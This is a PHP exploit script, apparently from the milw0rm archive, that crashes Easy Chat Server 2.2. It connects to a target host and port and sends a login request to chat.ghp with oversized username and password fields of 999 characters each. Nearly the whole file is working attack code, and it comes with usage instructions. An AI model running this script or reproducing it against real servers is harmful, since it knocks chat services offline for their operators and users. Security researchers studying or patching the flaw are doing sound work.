<?php

##########################################################
###----------------------------------------------------###
###--------Easy Chat Server Remote DoS Exploit---------###
###----------------------------------------------------###
###-http://www.echatserver.com/------------------------###
###----------------------------------------------------###
###-Tested on version 2.2 [last version]-(XP SP2)------###
###----------------------------------------------------###
###-Usage:-php dos.php [TARGET] [PORT]-----------------###
###----------------------------------------------------###
###-Author:--NetJackal---------------------------------###
###-Email:---nima_501[at]yahoo[dot]com-----------------###
###-Website:-http://netjackal.by.ru--------------------###
###----------------------------------------------------###
##########################################################

/*
Description:
 Easy Chat Server has built-in web server let users
login to chat server. Login page allow Max 30 characters
length for Name & Password. If attacker inserts a long Name &
Password by editing or make his own login page, chat server
will crash.
*/
echo \"Easy Chat Server Remote DoS Exploit\\n\\t\\t\\t\\tby NetJackal\";
if($argc<2)die(\"\\nUsage:   php dos.php [TARGET] [PORT]\\nExample: php dos.php localhost 80\\n\");
$host=$argv[1];
$port=$argv[2];
$A=str_repeat(\'A\',999);
echo \"\\nConnecting...\";
$link=fsockopen($host,$port,$en,$es,30);
if(!$link)die(\"\\n$en: $es\");
echo \"\\nConnected!\";
echo \"\\nSending exploit...\";
fputs($link,\"GET /chat.ghp?username=$A&password=$A&room=1&sex=2 HTTP/1.1\\r\\nHost: $host\\r\\n\\r\\n\");
echo \"\\nWell done!\\n\";
?>

# milw0rm.com [2007-08-14]
